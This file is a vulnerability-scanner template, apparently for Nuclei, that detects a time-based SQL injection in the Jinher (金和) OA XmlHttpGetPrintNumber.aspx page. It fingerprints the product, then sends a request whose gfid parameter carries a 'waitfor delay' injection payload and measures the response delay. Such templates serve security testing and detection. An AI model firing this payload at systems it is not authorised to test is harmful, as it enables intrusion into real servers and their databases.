id: poc-yaml-jinher-xmlhttpgetprintnumber-aspx-sqli
info:
  name: 金和OA XmlHttpGetPrintNumber.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    金和OA XmlHttpGetPrintNumber.aspx is vulnerable to a SQL injection vulnerability which allows an attacker to exploit the application.

variables:
  t1: "{{rand_int(2, 5)}}"
  t2: "{{to_number(t1) * 2}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.Archives/XmlHttpGetPrintNumber.aspx/?tid=IOA_Send&gfid=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0|0"
        part: body
      - type: word
        words:
          - "SessionId="
        part: header
      - type: dsl
        dsl:
          - "duration >= to_number(t2) && duration <= to_number(t3)"
